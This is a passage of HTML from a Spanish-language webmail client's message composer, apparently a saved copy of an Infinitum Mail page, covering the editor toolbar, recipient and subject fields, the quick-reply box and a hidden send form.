     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="POP3Status-fullscreen" onclickx="fnPOP3StatusExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="BPPhotoSlide-fullscreen" onclick="fnBPPhotoSlideExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="DropZone-fullscreen" onclick=""
     style="z-index:1001;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="Translator-fullscreen" onclick=""
     style="z-index:1001;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="MsgRule-fullscreen" onclick=""
     style="z-index:1001;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="SaveRecipients-fullscreen" onclick=""
     style="z-index:1001;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="AuthBOX-fullscreen" onclick=""
     style="z-index:1001;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="OnlineDocs-fullscreen" onclick="fnOnlineDocsExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#e3e4e8; display:none; opacity:.4"></div>
<div id="MediaVideo-fullscreen" onclick="fnMediaVideoExitFullscreen()"
     style="z-index:100;width:100%;  height:100% ;position:absolute; top:0px; left:0px; background-color:#000; display:none; opacity:.8"></div>
<!-- ::::: full screen divs ENDS  ::::: -->


<!-- ::::: RTE HTML inclide  ::::: -->


<!-- ##################   RTE ############################### -->

<div id="raptor-wrapper" class="RTEShadowbox"
     style="z-index:99; width:630px;position:absolute; top:0px; left:-1000px; font-size:12px; font-family:Arial, Helvetica, sans-serif; visibility:hidden; background-color:#fff;  border:1px #CCCCCC solid; color:#353b44">
    <!-- raptor-wrapper starts -->

    <div id="RTE_Header">
        <div id="RTE_Header_Title" class="RTEHNormal"
             style="color:#fff;  height:30px; line-height:30px; padding-right:8px; padding-left:8px; padding-right:8px">
            <div style="display:inline-block; float:left; font-weight:normal; max-width:480px; width: 480px ;white-space :nowrap; overflow:hidden; text-overflow: ellipsis; cursor:pointer;"
                 id="divRTETitle">Nuevo mensaje
            </div>
            <div style="display:inline-block; float:right; height:30px; line-height:30px;"><img id="rte_min"
                                                                                                src="./index_files/minimize_rte.png"
                                                                                                title="Minimizar"
                                                                                                onclick="fnRTEMinimize(); "
                                                                                                style="height:16px; width:16px; cursor:pointer; padding-top:0px; padding-right:8px">&nbsp;&nbsp;&nbsp;<img
                    id="rte_fullscreen" src="./index_files/fullscreen.png" title="Abrir en vista completa"
                    onclick="fnRTEFullScreen(false); "
                    style="height:16px; width:16px; cursor:pointer; padding-top:0px; padding-right:8px">&nbsp;&nbsp;&nbsp;<img
                    id="rte_min" src="./index_files/close_20_white(1).png" onclick="fnRTEXClose()" title="Cerrar"
                    style="padding-top:0px; height:16px; width:16px; cursor:pointer"></div>
        </div>

        <div id="rte_ToCc"
             style="width:610px; background-color:#fff; overflow-y: auto; overflow-x: hidden;  margin-left:10px; margin-right:10px">

            <div id="rtEmaillistFromRow" style="min-height: 30px; clear:both; display:none">
                <div id="rte_FromTxt"
                     style="height:28px;line-height:30px; width:50px; display:inline-block; float:left">&nbsp;De
                </div>
                <div id="" style="display:inline-block; float:left ;height:28px;line-height:30px;">
                    <a id="rtToAlias" class="jqTootltip" title="" style=""
                       href="JavaScript:fnShowPOPOpt(&#39;rtToAlias&#39;, &#39;mRTEAlias&#39;,0,-10)"><span
                            id="spanAlias"></span>&nbsp;&nbsp;<img id="mMainCheckOptImg" class="jqTootltip" width="8"
                                                                   height="4" src="./index_files/down_icon.png"></a>
                </div>
            </div>

            <div onclick="$(&#39;#rte_to&#39;).focus();" id="rtEmaillistToRow" style="min-height: 30px; clear:both; ">
                <div id="rte_ToTxt" style="height:28px;line-height:30px; width:50px; display:inline-block; float:left">
                    &nbsp;Para
                </div>
                <div id="rtEmaillistTo" style="display:inline-block; float:left"><input type="text" value=""
                                                                                        spellcheck="false"
                                                                                        autocomplete="false"
                                                                                        tabindex="10"
                                                                                        onfocus="fnSetRTEEmailFocus(this)"
                                                                                        dir="ltr" id="rte_to"
                                                                                        onblur="fnrtAutoComBlur()"
                                                                                        onkeydown="fnrteKeyDown(this,event)"
                                                                                        onkeyup="fnCheckRTEEmails(this,event);"
                                                                                        style=" color:#353B44; background-color:#fff;display:inline-block; float:left; width:463px; border:1px #fff; padding-top:8px; font-size:12px; font-family:Arial, Helvetica, sans-serif"><span
                        style="display:inline-block; float:right; margin-right:1px; padding-top:4px" id="AddCcBccSpan">  <a
                        id="aAddBcc" href="JavaScript:fnShowCcBcc(&#39;bcc&#39;)" class="AddccBcc jqTootltip"
                        title="Agregar destinatarios en copia oculta">Cco</a> <a id="aAddCc"
                                                                                 href="JavaScript:fnShowCcBcc(&#39;cc&#39;)"
                                                                                 style="margin-right:3px"
                                                                                 class="AddccBcc jqTootltip"
                                                                                 title="Agregar destinatarios con copia">Cc</a> </span>
                </div>
            </div>

            <div onclick="$(&#39;#rte_cc&#39;).focus();" id="rtEmaillistCcRow"
                 style="min-height: 30px; display:none; clear:both; border-top : #E1E1E1 1px solid">
                <div id="rte_ccTxt" style="height:30px;line-height:30px; width:50px; display:inline-block; float:left">
                    &nbsp;Cc
                </div>
                <div id="rtEmaillistCc" style="height:inherit; display:inline-block; float:left"><input type="text"
                                                                                                        value=""
                                                                                                        spellcheck="false"
                                                                                                        autocomplete="false"
                                                                                                        tabindex="11"
                                                                                                        onfocus="fnSetRTEEmailFocus(this)"
                                                                                                        dir="ltr"
                                                                                                        id="rte_cc"
                                                                                                        onblur="fnrtAutoComBlur()"
                                                                                                        onkeydown="fnrteKeyDown(this,event)"
                                                                                                        onkeyup="fnCheckRTEEmails(this,event);"
                                                                                                        style=" color:#353B44; background-color:#fff;display:inline-block; float:left; width:525px; border:1px #fff; padding-top:5px; padding-top:8px; font-size:12px; font-family:Arial, Helvetica, sans-serif">
                </div>
            </div>

            <div onclick="$(&#39;#rte_bcc&#39;).focus();" id="rtEmaillistBccRow"
                 style="min-height: 30px; display:none; clear:both; border-top : #E1E1E1 1px solid">
                <div id="rte_bccTxt" style="height:30px;line-height:30px; width:50px; display:inline-block; float:left">
                    &nbsp;Cco
                </div>
                <div id="rtEmaillistBcc" style="display:inline-block; float:left"><input type="text" value=""
                                                                                         spellcheck="false"
                                                                                         autocomplete="false"
                                                                                         tabindex="12"
                                                                                         onfocus="fnSetRTEEmailFocus(this)"
                                                                                         dir="ltr" id="rte_bcc"
                                                                                         onblur="fnrtAutoComBlur()"
                                                                                         onkeydown="fnrteKeyDown(this,event)"
                                                                                         onkeyup="fnCheckRTEEmails(this,event);"
                                                                                         style=" color:#353B44; background-color:#fff;display:inline-block; float:left; width:525px; border:1px #fff; padding-top:5px; padding-top:8px; font-size:12px; font-family:Arial, Helvetica, sans-serif">
                </div>
            </div>
        </div>

        <div id="rte_subjectRow" onclick="$(&#39;#rte_subject&#39;).focus();"
             style="border-top : #E1E1E1 1px solid; margin-left:10px; margin-right:10px;">

            <div id="rteSubjectTxt" style="height:30px; line-height:30px; display:inline-block; width:50px;">&nbsp;Asunto</div>
            <div id="rteSubjectBox" style=" display:inline-block;">
                <input id="rte_subject" type="text" onkeydown="fnrteCheckSubject(this)"
                       onkeypress="fnrteCheckSubject(this)" onblur="fnrteCheckSubject(this)"
                       oncopy="fnrteCheckSubject(this)" onchange="fnrteCheckSubject(this)" tabindex="13" value=""
                       style=" color:#353B44; background-color :#fff;  border:1px #fff; ; padding-top:8px; font-size:12px; font-family:Arial, Helvetica, sans-serif">
                <a id="aRTEPriority"
                   href="JavaScript:fnShowPOPOpt(&#39;aRTEPriority&#39;, &#39;mRTEPriorityMenu&#39;,-55,0)"
                   style="margin-right:3px; margin-left:6px" class="AddccBcc jqTootltip"
                   title="Establecer prioridad del mensaje">Prioridad&nbsp;&nbsp;<img alt="M�s opciones" height="4"
                                                                                      id=""
                                                                                      src="./index_files/down_icon.png"
                                                                                      width="8"></a>
            </div>
        </div>

    </div>

    <!-- RTE toolbar -->
    <div id="rteToolbar" style="background-color:#F7F7F7; width:100%; height:40px; line-height:37px">
        <a id="Undo" href="JavaScript:" style="display:none" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="##Undo"><img class="RTEicon postLoadIMG"
                                                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/undo.png"
                                                                                    src="https://www.infinitummail.com/app/"></a>
        <a id="Redo" href="JavaScript:" style="display:none" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="##Redo"><img class="RTEicon postLoadIMG"
                                                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/redo.png"
                                                                                    src="https://www.infinitummail.com/app/"></a>
        <a id="Bold" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Negritas"><img class="RTEicon postLoadIMG"
                                                                                      data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/bold.png"
                                                                                      src="https://www.infinitummail.com/app/"></a>
        <a id="Italic" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="It�licas"><img class="RTEicon postLoadIMG"
                                                                                      data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/italic.png"
                                                                                      src="https://www.infinitummail.com/app/"></a>
        <a id="Underline" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Subrayar"><img class="RTEicon postLoadIMG"
                                                                                      data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/underline.png"
                                                                                      src="https://www.infinitummail.com/app/"></a>
        <a id="Strikethrough" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Tachado"><img class="RTEicon postLoadIMG"
                                                                                     data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/strike_through.png"
                                                                                     src="https://www.infinitummail.com/app/"></a>
        <div style="display:inline-block; width:10px;"></div>
        <a id="Justifyleft" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Alinear texto a la izquierda"><img
                class="RTEicon postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/test_left.png"
                src="https://www.infinitummail.com/app/"></a>
        <a id="Justifycenter" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Alinear texto al centro"><img
                class="RTEicon postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/test_center.png"
                src="https://www.infinitummail.com/app/"></a>
        <a id="Justifyright" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Alinear texto a la derecha"><img
                class="RTEicon postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/text_right.png"
                src="https://www.infinitummail.com/app/"></a>
        <div style="display:inline-block; width:10px;"></div>
        <a id="InsertUnorderedList" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Lista con vi�etas"><img
                class="RTEicon postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/unordered_list.png"
                src="https://www.infinitummail.com/app/"></a>
        <a id="InsertOrderedList" href="JavaScript:" class="buttonRTE jqTootltip"
           onclick="formatText(this.id,&#39;xml_TextBody&#39;)" title="Lista numerada"><img class="RTEicon postLoadIMG"
                                                                                            data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/ordered_list.png"
                                                                                            src="https://www.infinitummail.com/app/"></a>
        <div style="display:inline-block; width:10px;"></div>
        <a id="btnRTEFont" href="JavaScript:fnRTEFontPicker(&#39;btnRTEFont&#39;)" class="buttonRTE jqTootltip"
           title="Tipo"><img class="RTEicon postLoadIMG"
                             data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/font_namepng.png"
                             src="https://www.infinitummail.com/app/"></a>
        <a id="btnRTEFontSize" href="JavaScript:fnRTEFontSizePicker(&#39;btnRTEFontSize&#39;)"
           class="buttonRTE jqTootltip" title="Tama�o"><img class="RTEicon postLoadIMG"
                                                            data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/font_size.png"
                                                            src="https://www.infinitummail.com/app/"></a>
        <a id="btnRTEColorPickerHighlight" href="JavaScript:fnOpenColorPicker(&#39;btnRTEColorPickerHighlight&#39;)"
           class="buttonRTE jqTootltip" title="Resaltar colores"><img class="RTEicon postLoadIMG"
                                                                      data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/text_colors.png"
                                                                      src="https://www.infinitummail.com/app/"></a>
        <a id="btnRTEColorPickerText" href="JavaScript:fnOpenColorPicker(&#39;btnRTEColorPickerText&#39;)"
           class="buttonRTE jqTootltip" title="Color del texto"><img class="RTEicon postLoadIMG"
                                                                     data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/highlight_colors.png"
                                                                     src="https://www.infinitummail.com/app/"></a>
        <div style="display:inline-block; width:10px;"></div>
        <a id="btnRTEEmoticon" href="JavaScript:fnRTEEmoticonPicker(&#39;btnRTEEmoticon&#39;)"
           class="buttonRTE jqTootltip" title="Insertar emoticon"><img class="RTEicon postLoadIMG"
                                                                       data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/1378457573_Streamline-65.png"
                                                                       src="https://www.infinitummail.com/app/"></a>

        <a id="btnRTEEmoticon" href="JavaScript:" onclick="fnRTEInsertLink()" class="buttonRTE jqTootltip"
           title="Insertar v�nculo"><img class="RTEicon postLoadIMG"
                                         data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/1378639388__link.png"
                                         src="https://www.infinitummail.com/app/"></a>

        <a id="rteAddSigbtn" href="JavaScript:" class="buttonRTE jqTootltip" onclick="fnGetSignature()"
           title="Insertar firma"><img class="RTEicon postLoadIMG"
                                       data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/1378346834_profile.png"
                                       src="https://www.infinitummail.com/app/"></a>
        <a id="rteTranslatebtn" href="JavaScript:fnOpenTranslatorApp(&#39;rte&#39;)" class="buttonRTE jqTootltip"
           title="Traducir"><img class="RTEicon postLoadIMG"
                                 data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/translate.png"
                                 src="https://www.infinitummail.com/app/"></a>
        <div style="display:inline-block; width:10px;"></div>
        <a id="rteClearbtn" href="JavaScript:" class="buttonRTE jqTootltip" onclick="fnRTERemoveHTML()"
           title="Quitar todo el formato HTML"><img class="RTEicon postLoadIMG"
                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/page_layout_icon&amp;16.png"
                                                    src="https://www.infinitummail.com/app/"></a>
        <a id="rteClearbtn" href="JavaScript:" class="buttonRTE jqTootltip" onclick="fnCleartMsgBtn()"
           title="Limpiar mensaje"><img class="RTEicon postLoadIMG"
                                        data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img//RTE/1378346807_delete.png"
                                        src="https://www.infinitummail.com/app/"></a>
    </div>
    <!-- RTE iframe -->
    <iframe src="./index_files/richtextbody.html" frameborder="0"
            style="width:100%; height:400px; background-color:#ffffff; border:0px; overflow:hidden" tabindex="14"
            id="RichEditIFrameID" __idm_frm__="2967"></iframe>


    <div class="ui-editor-path" id="RTE_BActions"
         style="display:block; height:45px; background-color:#F4F4F4;  vertical-align:middle; line-height:45px; border-top: 1px solid #D4D4D4">
        <div style="border: 0px solid #fff">
            &nbsp;&nbsp;<a id="btnSendMail" title="Enviar ahora" href="javascript:fnRTESend()" tabindex="15"
                           class="buttonSnd" style="font-weight:bold">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enviar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>&nbsp;&nbsp;&nbsp;&nbsp;
            <a id="btnAttach" href="javascript:InitQuickAttach(&#39;composer&#39;)" tabindex="16"
               title="Adjuntar archivos" class="button jqTootltip">&nbsp;<img class="postLoadIMG"
                                                                              data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/attRTE.png"
                                                                              src="https://www.infinitummail.com/app/"
                                                                              title="Adjuntar archivos"
                                                                              style="height:16px; width:16px; cursor:pointer">&nbsp;</a>

            <a id="btnRTEDriveBoxMenu" href="javascript:fnOpenDriveBoxMenu(true)" tabindex="17"
               title="Adjuntar archivos de Infinitum Drive" class="button jqTootltip">&nbsp;<img class="postLoadIMG"
                                                                                                 data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/drivebox.png"
                                                                                                 src="https://www.infinitummail.com/app/"
                                                                                                 style="height:20px; width:20px; cursor:pointer">&nbsp;</a>
            <a id="btnRTEShareMenu" href="javascript:fnOpenShareMenu()" tabindex="18"
               title="Compartir archivos desde Facebook, Twitter y otros sitios" class="button jqTootltip">&nbsp;<img
                    class="postLoadIMG"
                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/share_gray.png"
                    src="https://www.infinitummail.com/app/" style="height:20px; width:20px; cursor:pointer">&nbsp;</a>

            <a id="btnSpellChk" href="javascript:fnSpellCheck()" tabindex="19" title="Revisar ortograf�a"
               class="button jqTootltip">&nbsp;<img class="postLoadIMG"
                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/spell.png"
                                                    src="https://www.infinitummail.com/app/"
                                                    style="height:20px; width:30px; cursor:pointer">&nbsp;</a>
            <a id="btnSchedule" href="javascript:" title="Revisar ortograf�a" class="button buttonOff jqTootltip"
               style="display:none">&nbsp;<img class="postLoadIMG"
                                               data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/1368579486_52_Clock.png"
                                               src="https://www.infinitummail.com/app/"
                                               style="height:16px; width:16px; cursor:pointer">&nbsp;</a>
            <a id="btnSaveMail" tabindex="20" href="javascript:fnSaveDraft(&#39;m&#39;)" title="Guardar Borrador"
               class="button jqTootltip">&nbsp;<img class="postLoadIMG"
                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/save.png"
                                                    src="https://www.infinitummail.com/app/"
                                                    style="height:20px; width:20px; cursor:pointer">&nbsp;</a>
            <span style="float:right;"><input type="CHECKBOX" id="ckbRequestReceipt">Solicitud de le�do&nbsp;&nbsp;&nbsp;&nbsp;</span>
        </div>
    </div>

</div> <!-- raptor-wrapper ENDS -->

<style>
    [contentEditable=true]:empty:not(:focus):before {
        content: attr(data-text)
    }

    #rte_QuickT:focus, input:focus {
        outline: none;
    }

</style>

<style type="text/css">
    -webkit-text-size-adjust:none

    ;
    -ms-text-size-adjust:none

    ;
    -moz-text-size-adjust:none

    ;
    text-size-adjust:none

    ;

</style>


<!-- Quick reply -->
<div id="Quickraptor-wrapper" class="RTEShadowbox"
     style="z-index:99; min-height: 45px ;width:630px;position:absolute; top:0px; left:-1000px; font-size:12px; font-family:Arial, Helvetica, sans-serif; visibility:hidden; background-color:#fff;  border:1px #CCCCCC solid; border-top:0px  white solid;color:#353b44; overflow:hidden">

    <div id="box" class="ui-editor-path"
         style="display:block; min-height: 45px; background-color:#fff;  vertical-align:bottom;  border-top: 1px solid #D4D4D4; overflow:hidden; font-size:12px; font-family:Arial, Helvetica, sans-serif">
        <div style="display:inline-block; width:117px ; min-width:117px; max-width:117px; xbackground-color:aqua; vertical-align:bottom; min-height: 45px; line-height:45px; font-size:12px !important; font-family:Arial, Helvetica, sans-serif; overflow:hidden">
            <img style="border:0px; width:6px; height:45px" src="./index_files/trans.png"><a id="btnQuickSendMail"
                                                                                             title="Send reply now"
                                                                                             href="javascript:fnQuickRTESend()"
                                                                                             tabindex="15"
                                                                                             class="buttonSnd"
                                                                                             style="font-weight:bold; font-size:12px !important; font-family:Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;Contestar&nbsp;&nbsp;&nbsp;</a>&nbsp;&nbsp;<a
                id="btnQuickRTEEmoticon" href="JavaScript:fnRTEEmoticonPicker(&#39;btnQuickRTEEmoticon&#39;)"><img
                src="./index_files/1378457573_Streamline-65.png" title="Insert emoticon" class="RTEicon postLoadIMG"
                style="cursor:pointer"></a></div>
        <div id="rte_QuickTP"
             style="white-space: nowrap; display:inline-block; width:436px; xbackground-color:teal; overflow:hidden; height:45px">
            <div onkeyup="fnTimeResizeQuickRTE()" onkeydown="fnTimeResizeQuickRTE()" xonblur="fnTimeResizeQuickRTE()"
                 contenteditable="true" id="rte_QuickT"
                 style="padding-top:16px; min-height: 12px; xbackground-color:lime; padding-BOTTOM:14px; font-size: 12px; font-family: Arial,Helvetica,sans-serif; line-height:12px; white-space: pre-wrap"
                 data-text="Escribir una respuesta�"></div>
        </div>
        <div style=" display:inline-block; width:69px; xbackground-color:navy; vertical-align:bottom; min-height: 45px; line-height:45px;">
            <a id="btnQuickAttach" href="javascript:InitQuickAttach(&#39;composer&#39;)" tabindex="16"
               title="Adjuntar archivos" class="jqTootltip"
               style="height:45px; line-height:45px; background-color:#fff">&nbsp;<img class="postLoadIMG"
                                                                                       data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/attRTE.png"
                                                                                       src="https://www.infinitummail.com/app/"
                                                                                       title="Adjuntar archivos"
                                                                                       style="height:16px; width:16px; cursor:pointer">&nbsp;</a><a
                id="btnQuickResponses"
                href="JavaScript:fnQuickResponsesPickerInt();fnQuickResponsesPicker(&#39;btnQuickResponses&#39;)"><img
                class="postLoadIMG" data-url="../../app/img/RTE/quick_icon16.jpg"
                src="https://www.infinitummail.com/app/" title="Inserte una respuesta r�pida"
                style="height:16px; width:16px; cursor:pointer"></a>&nbsp;<a id="btnQuickRTMenuOpt"
                                                                             href="JavaScript:fnQuickRTMenuOpt(&#39;btnQuickRTMenuOpt&#39;)"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/more_opt_16.png"
                src="https://www.infinitummail.com/app/" title="M�s opciones"
                style="height:16px; width:16px; cursor:pointer"></a></div>
    </div>

</div>
<!-- Quick reply ends -->

<div id="rte_Minimize" class="RTEHNormal"
     style="color:#fff; height:30px; line-height:30px; padding-right:8px; padding-left:8px; width:190px; position:absolute; top:100px; left:100px; visibility:hidden">
    <div style="display:inline-block; float:left; font-weight:normal; cursor:pointer; max-width:96px; white-space:nowrap; overflow:hidden; text-overflow: ellipsis;"
         onclick="fnRTEMaximize()" id="divRTETitleMin" class="jqTootltip" title="Maximizar">Nuevo mensaje
    </div>
    <div style="display:inline-block; float:right"><img id="rte_min" src="./index_files/expand_rte.png"
                                                        onclick="fnRTEMaximize();" title="Maximizar"
                                                        style="height:16px; width:16px; cursor:pointer">&nbsp;&nbsp;&nbsp;<img
            id="rte_min_fullscreen" onclick="fnRTEFullScreen(true); " title="Pantalla completa"
            src="./index_files/fullscreen.png" style="height:16px; width:16px; cursor:pointer;">&nbsp;&nbsp;&nbsp;<img
            id="rte_min" src="./index_files/close_20_white(1).png" onclick="fnRTEXClose();" title="Cerrar"
            style="height:16px; width:16px; cursor:pointer"></div>
</div>


<div id="rte_Actionstatus" style="position :absolute; display:none;z-index:1000; height:32px; line-height:32px; ">
    <div id="rte_attach" title="Mostrar adjuntos"
         style=" background-color:#F4F4F4; display:none; height:32px; line-height:32px; float:left; box-shadow: 2px 2px 2px rgb(202, 202, 202)"
         class="jqTootltip">
        <a id="lstAttach" href="javascript:fnShowAttachList()" class="InboxActions">&nbsp;&nbsp;&nbsp;&nbsp;<img
                src="./index_files/a.png" style="padding-top:0px" width="16px" height="16px"
                align="absmiddle">&nbsp;<span id="spanAttachCount">xxx</span>&nbsp;<b>...</b>&nbsp;&nbsp;<img
                src="./index_files/ajax-loader.gif" width="16px" height="16px" id="AttachBusy"
                style="height:16px; width:16px; visibility:hidden"></a>
        <img style="height:16px; width:16px; cursor:pointer" class="jqTootltip" title="Quitar todos los adjuntos"
             onclick="fnRemoveAllAttach()" src="./index_files/close_16.png" width="16px" height="16px">&nbsp;&nbsp;
    </div>
    <div style="width:3px; float:left; display:block; height:32px"></div>
    <div id="rte_Recheckspelling"
         style=" background-color:#F4F4F4; display:none; height:32px; line-height:32px; float:left;"><a
            id="aRecheckspelling" href="javascript:fnSpellCheck()" title="Volver a revisar la ortograf�a"
            class="InboxActions jqTootltip">&nbsp;&nbsp;&nbsp;Volver a revisar la ortograf�a&nbsp;&nbsp;</a>
        <div onclick="fnCloseSpellCheck()" class="jqTootltip" title="Cerrar"
             style="float:right; display:block ; height:32px; line-height:32px;  ;background-color:#EEEEEE; "><img
                alt="Cerrar" src="./index_files/close_16.png" align="absmiddle" id=""
                style="height:16px; width:16px; cursor:pointer; padding:8px"></div>
    </div>
</div>


<div id="mSendForm" style="display:none">
    <form id="main_form" name="main_form" action="https://www.infinitummail.com/app/" method="post" target="my_iframe">
        <input type="hidden" name="faction" value="none" id="Hidden2">
        <input type="hidden" name="SavedDraftGUID" value="" id="SavedDraftGUID">
        <input type="hidden" name="AllFiles" value="" id="AllFiles">
        <input type="hidden" name="FolderIDs" value="" id="FolderIDs">
        <input type="hidden" name="lastInput" value="" id="lastInput">
        <input type="hidden" name="TotalSize" value="0" id="TotalSize">
        <input type="hidden" name="xml_Priorities" value="1" id="xml_Priorities">
        <input type="text" name="xml_From" value="" id="xml_From">
        <input type="text" name="xml_To" value="" dir="ltr" size="20" id="xml_To">
        <input type="text" name="xml_Cc" value="" dir="ltr" size="20" id="xml_Cc">
        <input type="text" name="xml_Bcc" value="" dir="ltr" size="20" id="xml_Bcc">
        <input type="text" name="xml_Subject" value="" maxlength="80" size="20" id="xml_Subject">
        <input type="checkbox" name="mail_save_message" value="true" checked="checked" id="Checkbox5">
        <input type="checkbox" name="mail_request_receipt" value="true" id="mail_request_receipt">
        <input type="hidden" name="xml_TextBody" value="" id="xml_TextBodyID">
        <input type="hidden" name="mail_as_HTML" value="true" id="Hidden7">
        <input type="hidden" name="RichTextFormat" value="true" id="Hidden8">
        <input type="hidden" name="RemoveRichTextFormat" value="" id="Hidden9">
        <input type="hidden" name="sMsgId" value="" id="Hidden10">
        <input type="hidden" name="sAction" value="" id="Hidden11">
        <input type="hidden" name="multilingual" value="false" id="multilingual">
        <input type="hidden" name="translate_menu" value="none_none" id="translate_menu">
        <input type="hidden" name="Send_mail" value="" id="Hidden13">
        <input type="hidden" name="jsaddsig" value="" id="Hidden15">
        <input type="hidden" name="translate_to" value="" id="translate_to">
        <input type="hidden" name="translate_from" value="" id="translate_from">
        <input type="hidden" name="xml_AttachForward" value="" id="xml_AttachForward">
        <input type="hidden" name="xml_AttachSizeForward" value="" id="xml_AttachSizeForward">
        <input type="hidden" name="AttachTotalSizeForward" value="" id="AttachTotalSizeForward">
        <input type="hidden" name="Open_HTML_VK" value="false" id="Open_HTML_VK">
        <input type="hidden" name="save_draft" value="" id="save_draft">
        <input type="hidden" name="sBackgroundColorRTF" value="" id="sBackgroundColorRTF">
        <input type="hidden" name="VK_CurrentLang" value="English" id="VK_CurrentLang">
        <input type="hidden" name="MsgType" value="" id="MsgType">
        <input type="hidden" name="KeepSavedDraft" value="yes" id="KeepSavedDraft">
